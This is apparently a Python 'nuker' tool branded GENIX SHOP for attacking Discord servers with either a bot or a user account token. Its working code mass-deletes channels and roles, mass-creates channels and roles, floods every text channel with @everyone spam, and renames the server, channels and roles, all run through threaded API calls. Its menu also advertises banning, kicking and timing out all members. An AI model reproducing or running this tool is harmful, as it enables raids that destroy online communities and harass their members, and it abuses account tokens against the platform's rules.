import time
import json
import os
import threading

try:
	from pystyle import Colors, Colorate, Box
	import discord
	from discord.ext import commands
	import requests
except ImportError:
	os.system("pip install requests")
	os.system("pip install pystyle")
	os.system("pip install discord")
	
def genixshop(token,guild,na):
	res = requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": token},json={"type":0,"name":na,"permission_overwrites":[]})
	if res.status_code == 201 or res.status_code == 200:
		id = res.json()['id']
		print(Colorate.Horizontal(Colors.rainbow, f"              [+] Create Channels - {id} Text"))
	elif res.status_code == 404:
		print(Colorate.Horizontal(Colors.rainbow, f"""               [-] Unknown server - '{guild}' """), end="\r")
	elif res.status_code == 400:
		print(Colorate.Horizontal(Colors.rainbow, f"               [-] The server ID format is invalid "), end="\r")
	elif res.status_code == 429:
		tim = res.json()['retry_after']
		print(Colorate.Horizontal(Colors.rainbow, f"               [-] RalteLimited For {tim} seconds !"))
	else:
		print(res,res.json())
		
def genixshop2(token,guild,na):
	res = requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": token},json={"type":2,"name":na,"permission_overwrites":[]})
	if res.status_code == 201 or res.status_code == 200:
		id = res.json()['id']
		print(Colorate.Horizontal(Colors.rainbow, f"              [+] Create Channels - {id} Voice"))
	elif res.status_code == 404:
		print(Colorate.Horizontal(Colors.rainbow, f"""               [-] Unknown server - '{guild}' """), end="\r")
	elif res.status_code == 400:
		print(Colorate.Horizontal(Colors.rainbow, f"               [-] The server ID format is invalid "), end="\r")
	elif res.status_code == 429:
		tim = res.json()['retry_after']
		print(Colorate.Horizontal(Colors.rainbow, f"               [-] RalteLimited For {tim} !"))
	else:
		print(res,res.json())
	
def token_checker(tokens):
	headers = {
		"authorization": tokens
	}
	response = requests.get("https://discord.com/api/v9/users/@me/library?country_code=TH", headers = headers)
	if (response.status_code == 401 or response.status_code == 403):
		print()
		print(Colorate.Horizontal(Colors.green_to_cyan, "             [!] ERROR INVILD FOR TOKENS. "))
		time.sleep(2)
		clientattack()
	else:
		pass
	
def delete(tk,chann):
	response = requests.delete(f"https://discord.com/api/v9/channels/{chann}",headers={"authorization": f"Bot {tk}"}).json()
		
def create(tk,serv,na):
	try:
		response = requests.post(f"https://discord.com/api/v9/guilds/{serv}/channels",headers={"authorization": f"Bot {tk}"},json={"type":0,"name":na,"permission_overwrites":[]})
	except:
		pass
		
def delete_roles(tk,guild,r):
	try:
		requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{r}",headers={"authorization": f"Bot {tk}"})
	except:
		pass
		
def create_roles(tk,guild,na):
	try:
		requests.post(f"https://discord.com/api/v9/guilds/{guild}/roles",headers={"authorization": f"Bot {tk}"},json={"name":na,"color":0,"permissions":"0"})
	except:
		pass
		
def edit_server(tk,guild,n):
	requests.patch(f"https://discord.com/api/v9/guilds/{guild}",headers={"authorization": f"Bot {tk}"},json={"name":n,"description":None,"icon":None,"splash":None,"banner":None,"home_header":None,"afk_channel_id":None,"afk_timeout":300,"system_channel_id":None,"verification_level":0,"default_message_notifications":0,"explicit_content_filter":0,"system_channel_flags":0,"public_updates_channel_id":None,"safety_alerts_channel_id":None,"premium_progress_bar_enabled":False})
		
def edit_roles(tk,guild,r,name):
	try:
		requests.patch(f"https://discord.com/api/v9/guilds/{guild}/roles/{r}",headers={"authorization": f"Bot {tk}"},json={"name":name,"permissions":"0","color":0,"hoist":False,"mentionable":False,"icon":None,"unicode_emoji":None})
	except:
		pass
		
def edit_channels(tk,id,na):
	try:
		requests.patch(f"https://discord.com/api/v9/channels/{id}",headers={"authorization": f"Bot {tk}"},json={"name":na,"type":0,"topic":"","bitrate":64000,"user_limit":0,"nsfw":False,"flags":0,"rate_limit_per_user":0})
	except:
		pass
		
def send(tk,id,message):
	requests.post(f"https://discord.com/api/v9/channels/{id}/messages",headers={"authorization": f"Bot {tk}"},json={"content": message})
	
banner = Colorate.DiagonalBackwards(Colors.rainbow, """
░██████╗░███████╗███╗░░██╗██╗██╗░░██╗  ░██████╗██╗░░██╗░█████╗░██████╗░
██╔════╝░██╔════╝████╗░██║██║╚██╗██╔╝  ██╔════╝██║░░██║██╔══██╗██╔══██╗
██║░░██╗░█████╗░░██╔██╗██║██║░╚███╔╝░  ╚█████╗░███████║██║░░██║██████╔╝
██║░░╚██╗██╔══╝░░██║╚████║██║░██╔██╗░  ░╚═══██╗██╔══██║██║░░██║██╔═══╝░
╚██████╔╝███████╗██║░╚███║██║██╔╝╚██╗  ██████╔╝██║░░██║╚█████╔╝██║░░░░░
░╚═════╝░╚══════╝╚═╝░░╚══╝╚═╝╚═╝░░╚═╝  ╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░░░░
""")


def clientattack():
	clear()
	print(banner)
	print()
	print(Colorate.Horizontal(Colors.yellow_to_red, "                      MODE TYPE : CLIENT ATTACK"))
	print()
	print(Colorate.Horizontal(Colors.yellow_to_red, "    [#] Please select the option you want : "))
	print()
	print(Colorate.Diagonal(Colors.rainbow, "       [1] DELETE CHANNELS           [7] CHANGE SERVER ( AUTOMATICH )"))
	print(Colorate.Diagonal(Colors.rainbow, "       [2] CREATE CHANNELS           [8] MEMBERS SERVER BAN ALL"))
	print(Colorate.Diagonal(Colors.rainbow, "       [3] SPAM MESSAGE ( NUKER )    [9] MEMBERS SERVER KICK ALL"))
	print(Colorate.Diagonal(Colors.rainbow, "       [4] RENAME SERVER             [10] DELETE ROLES ALL IN SERVER"))
	print(Colorate.Diagonal(Colors.rainbow, "       [5] RENAME CHANNELS           [11] CHANGE NAME ALL MEMBERS"))
	print(Colorate.Diagonal(Colors.rainbow, "       [6] CREATE ROLES              [12] TIMEOUT ALL MEMBERS"))
	print()
	print(Colorate.Diagonal(Colors.blue_to_red, "                         [00] Back To Home"))
	print()
	select = input(Colorate.Horizontal(Colors.green_to_cyan, "    SELECT MODE : "))
	if (select == "1" or select == "01"):
		print()
		token = input(Colorate.Horizontal(Colors.green_to_cyan, "         TOKEN : "))
		token_checker(token)
		guild = input(Colorate.Horizontal(Colors.green_to_cyan, "         SERVER ID : "))
		print()
		try:
			res = requests.get(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": token})
			if res.json() == []:
				print(Colorate.Horizontal(Colors.rainbow, "             There are no rooms on this server !"))
				time.sleep(2)
				clientattack()
			else:
				for channel in json.loads(res.text):
					def startbot(chann):
						response = requests.delete(f"https://discord.com/api/v9/channels/{chann}",headers={"authorization": f"{token}"})
						if response.status_code == 200:
							id = response.json()['id']
							print(Colorate.Horizontal(Colors.rainbow, f"               [-] Deleted Channels - {id}"))
						else:
							print(Colorate.Horizontal(Colors.rainbow, "             Can't be deleted because you don't have a role !"), end="\r")
					threading.Thread(target=startbot, args=[channel['id']]).start()
				time.sleep(3)
				clientattack()
		except:
			print()
			print(Colorate.Horizontal(Colors.rainbow, "             This server does not exist !"))
			time.sleep(2)
			clientattack()
	elif (select == "00" or select == "0"):
		homepage()
	elif select == "":
		clientattack()
	elif select == "2" or select == "02":
		print()
		token = input(Colorate.Horizontal(Colors.green_to_cyan, "         TOKEN : "))
		token_checker(token)
		guild = input(Colorate.Horizontal(Colors.green_to_cyan, "         SERVER ID : "))
		type = input(Colorate.Horizontal(Colors.green_to_cyan, "         What kind do you want to build (voice,text) : "))
		na = input(Colorate.Horizontal(Colors.green_to_cyan, "         NICKNAME : "))
		if type == "voice" or type == "Voice" or type == "v" or type == "V":
			try:
				jam = int(input(Colorate.Horizontal(Colors.green_to_cyan, "         NUMBER : ")))
				print()
				
				for i in range(jam):
					threading.Thread(target=genixshop2, args=[token,guild,na]).start()
				time.sleep(2)
				clientattack()
			except:
				print()
				print(Colorate.Horizontal(Colors.rainbow, "             The number style is invalid !"))
				time.sleep(2)
				clientattack()
		else:
			try:
				jam = int(input(Colorate.Horizontal(Colors.green_to_cyan, "         NUMBER : ")))
				print()
				
				for i in range(jam):
					threading.Thread(target=genixshop, args=[token,guild,na]).start()
				time.sleep(2)
				clientattack()
			except:
				print()
				print(Colorate.Horizontal(Colors.rainbow, "             The number style is invalid !"))
				time.sleep(2)
				clientattack()
		
	elif select == "3" or select == "03":
		print()
		token = input(Colorate.Horizontal(Colors.green_to_cyan, "         TOKEN : "))
		token_checker(token)
		guild = input(Colorate.Horizontal(Colors.green_to_cyan, "         SERVER ID : "))
		msg = input(Colorate.Horizontal(Colors.green_to_cyan, "         MESSAGE : "))
		type = input(Colorate.Horizontal(Colors.green_to_cyan, "         Do you want to send to all channels? (yes,no) : "))
		if type == "Yes" or type == "yes" or type == "Y" or "y":
			try:
				num = int(input(Colorate.Horizontal(Colors.green_to_cyan, "         NUM : ")))
				print()
				
				try:
					res = requests.get(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": token})
					if res.json() == []:
						print()
						print(Colorate.Horizontal(Colors.rainbow, "                There are no rooms on this server !"))
						time.sleep(2)
						clientattack()
					else:
						for i in range(num):
							for channel in json.loads(res.text):
								def startbot(chann,content):
									response = requests.post(f"https://discord.com/api/v9/channels/{chann}/messages",headers={"authorization": token},json={"content": content})
									if response.status_code == 200:
										id = response.json()['id']
										print(Colorate.Horizontal(Colors.rainbow, f"               [+] Sent to Channels - {id}"))
									elif response.status_code == 429:
										re = response.json()['retry_after']
										print(Colorate.Horizontal(Colors.rainbow, f"               [-] RateLimited For - {re}"), end="\r")
										time.sleep(float(re))
									else:
										print(response.json(),response)
								threading.Thread(target=startbot, args=[channel['id'],msg]).start()
						time.sleep(3)
						clientattack()
				except:
					print()
					print(Colorate.Horizontal(Colors.rainbow, "                This server does not exist !"))
					time.sleep(2)
					clientattack()
			except:
				print()
				print(Colorate.Horizontal(Colors.rainbow, "                The number style is invalid !"))
				time.sleep(2)
				clientattack()
		else:
			try:
				num = int(input(Colorate.Horizontal(Colors.green_to_cyan, "         NUM : ")))
			except:
				print()
				print(Colorate.Horizontal(Colors.rainbow, "             The number style is invalid !"))
				time.sleep(2)
				clientattack()
	

def botattack():
	clear()
	print(banner)
	print()
	print(Colorate.Horizontal(Colors.yellow_to_red, "                      MODE TYPE : BOT ATTACK"))
	print()
	try:
		token = input(Colorate.Horizontal(Colors.green_to_cyan, "    TOKEN  : "))
		prefix = input(Colorate.Horizontal(Colors.green_to_cyan, "    PREFIX : "))
		print()
		if (token == "" or prefix == ""):
			bot()
	except:
		botattack()
	
	bot = commands.Bot(command_prefix=prefix, intents = discord.Intents.all())
	
	@bot.event
	async def on_ready():
		clear()
		print(banner)
		print()
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}dc | Delete Channels"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}cc <name> <ammo> | Create Text Channels"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}dr | Delete Roles"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}cr <name> <ammo> | Create Roles"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}bomb <message> <ammo> | Spam Message"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}rs <name> | Change Server Nickname"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}rc <name> | Change Channels Nickname"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}auto | Auto Spam Discord Server"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}close | Close ALL"))
		print()
		# ลบห้อง print(Colorate.DiagonalBackwards(Colors.rainbow,f"        [-] Deleted Channels 1143448217665671231 Successfully !", True))
		
	@bot.command()
	async def dc(ctx):
		await ctx.message.delete()
		for channel in ctx.guild.channels:
			try:
				threading.Thread(target=delete, args=[token,channel.id]).start()
			except:
				pass
		clear()
		print(banner)
		print()
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}dc | Delete Channels"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}cc <name> <ammo> | Create Text Channels"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}dr | Delete Roles"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}cr <name> <ammo> | Create Roles"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}bomb <message> <ammo> | Spam Message"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}rs <name> | Change Server Nickname"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}rc <name> | Change Channels Nickname"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}auto | Auto Spam Discord Server"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}close | Close ALL"))
		print()
	
	@bot.command()
	async def cc(ctx, name:str=None, jam:int=None):
		if (name == None or jam == None):
			await ctx.message.delete()
			for i in range(30):
				threading.Thread(target=create, args=[token,ctx.guild.id,"GENIX SHOP"]).start()
		else:
			await ctx.message.delete()
			for i in range(jam):
				threading.Thread(target=create, args=[token,ctx.guild.id,name]).start()
			
	@bot.command()
	async def close(ctx):
		await ctx.message.delete()
		os._exit(0)
			
	@bot.command()
	async def dr(ctx):
		await ctx.message.delete()
		for role in ctx.guild.roles:
			try:
				threading.Thread(target=delete_roles(token,ctx.guild.id,role.id)).start()
			except:
				pass
	
	@bot.command()
	async def cr(ctx, name:str=None, jam:int=None):
		if (name == None or jam == None):
			await ctx.message.delete()
			for i in range(20):
				threading.Thread(target=create_roles, args=[token,ctx.guild.id,"GENIX SHOP"]).start()
		else:
			await ctx.message.delete()
			for i in range(jam):
				threading.Thread(target=create_roles, args=[token,ctx.guild.id,name]).start()
		
	@bot.command()
	async def rr(ctx, name=None):
		if (name == None):
			await ctx.message.delete()
			for role in ctx.guild.roles:
				try:
					threading.Thread(target=edit_roles, args=[token,ctx.guild.id,role.id,"GENIX SHOP"]).start()
				except:
					pass
		else:
			await ctx.message.delete()
			for role in ctx.guild.roles:
				try:
					threading.Thread(target=edit_roles, args=[token,ctx.guild.id,role.id,name]).start()
				except:
					pass
		
	@bot.command()
	async def bomb(ctx, msg:str=None, jam:int=None):
		if (msg == None or jam == None):
			await ctx.message.delete()
			for ch in ctx.guild.text_channels:
				try:
					for i in range(10):
						threading.Thread(target=send, args=[token,ch.id,"@everyone **BY GENIX SHOP** @here"]).start()
				except:
					pass
		else:
			await ctx.message.delete()
			for ch in ctx.guild.text_channels:
				try:
					for i in range(jam):
						threading.Thread(target=send, args=[token,ch.id,msg]).start()
				except:
					pass
					
	@bot.command()
	async def rs(ctx, name=None):
		if (name == None):
			await ctx.message.delete()
			threading.Thread(target=edit_server, args=[token,ctx.guild.id,"GENIX SHOP"]).start()
		else:
			await ctx.message.delete()
			threading.Thread(target=edit_server, args=[token,ctx.guild.id,name]).start()
		
	@bot.command()
	async def rc(ctx, name=None):
		if (name == None):
			await ctx.message.delete()
			for chann in ctx.guild.channels:
				try:
					threading.Thread(target=edit_channels, args=[token,chann.id,"GENIX SHOP"]).start()
				except:
					pass
		else:
			await ctx.message.delete()
			for chann in ctx.guild.channels:
				try:
					threading.Thread(target=edit_channels, args=[token,chann.id,name]).start()
				except:
					pass
					
	@bot.command()
	async def auto(ctx):
		await ctx.message.delete()
		edit_server(token,ctx.guild.id,"GENIX SHOP")
		for channel in ctx.guild.channels:
			try:
				threading.Thread(target=delete, args=[token,channel.id]).start()
			except:
				pass
		for i in range(30):
			try:
				threading.Thread(target=create, args=[token,ctx.guild.id,"GENIX SHOP"]).start()
			except:
				pass
		
	try:
		bot.run(token)
	except:
		print()
		print(Colorate.Horizontal(Colors.green_to_cyan, "             [!] ERROR INVILD FOR TOKENS. "))
		time.sleep(2)
		botattack()
	
	
def clear():
	if os.name == "nt":
		os.system("cls")
	else:
		os.system("clear")


def homepage():
	clear()
	print(banner)
	print()
	print(Colorate.Horizontal(Colors.yellow_to_red, "    [#] Please select the option you want : "))
	print()
	print(Colorate.Diagonal(Colors.rainbow, "           [01] ATTACK WITH BOT        [02] ATTACK WITH CLIENT"))
	print()
	print(Colorate.Diagonal(Colors.blue_to_red, "                             [00] Exit"))
	print()
	select = input(Colorate.Horizontal(Colors.green_to_cyan, "    SELECT MODE : "))
	if (select == "01" or select == "1"):
		botattack()
	elif (select == "02" or select == "2"):
		clientattack()
	elif (select == "00" or select == "0"):
		print("\n")
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  Good Byeeeeee :)"))
	else:
		homepage()
	
homepage()


